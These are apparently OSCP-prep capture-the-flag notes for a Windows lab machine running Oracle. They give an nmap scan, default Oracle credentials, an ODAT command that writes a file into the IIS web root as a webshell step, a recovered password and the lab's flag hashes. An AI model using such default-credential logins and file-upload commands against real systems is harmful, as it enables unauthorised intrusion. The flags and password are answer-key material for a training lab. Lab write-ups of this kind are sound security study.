# SILO / OSCP PREP

![](../.gitbook/assets/6e6a0b49a63a4b45b52b6d5cd54ac8f6.png)

## NMAP SCAN

```text
PORT      STATE SERVICE      REASON          VERSION
80/tcp    open  http         syn-ack ttl 127 Microsoft IIS httpd 8.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   syn-ack ttl 127 Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49159/tcp open  oracle-tns   syn-ack ttl 127 Oracle TNS listener (requires service name)
49160/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49161/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49162/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
```

## PORT 1521 ORACLE

![](../.gitbook/assets/05d6252717bf4e358cda74c36c27b968.png)

```text
https://github.com/quentinhardy/odat

https://dastinia.io/tutorial/2018/07/31/installing-oracle-database-attacking-tool-on-kali/
```

#### DEFAULT CREDENTIALS

```text
SCOTT:TIGER
```

#### LOGIN

![](../.gitbook/assets/63400186788b4dda993ba13b1c03babb.png)

### UPLOAD WEBSHELL

```text
odat dbmsadvisor -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot 0xdf.txt <(echo 0xdf was here)
```

![](../.gitbook/assets/cd602f00ac404cc4a84e2d0d2d9616a4.png)

![](../.gitbook/assets/edd372dda7574bf49fbb759951f01de0.png)

## PRIVESC

![](../.gitbook/assets/668a4beac97a40da819867162dcf31ae.png)

```text
£%Hm8646uC$
```

![](../.gitbook/assets/70c6b5e81f79439295aa3d8f3249ced8.png)

![](../.gitbook/assets/a64cac93df234ba08856eb2c18b2cf4c.png)

## FLAGS

### USER

```text
92ede778a1cc8d27cb6623055c331617
```

### ROOT

```text
cd39ea0af657a495e33bc59c7836faf6
```

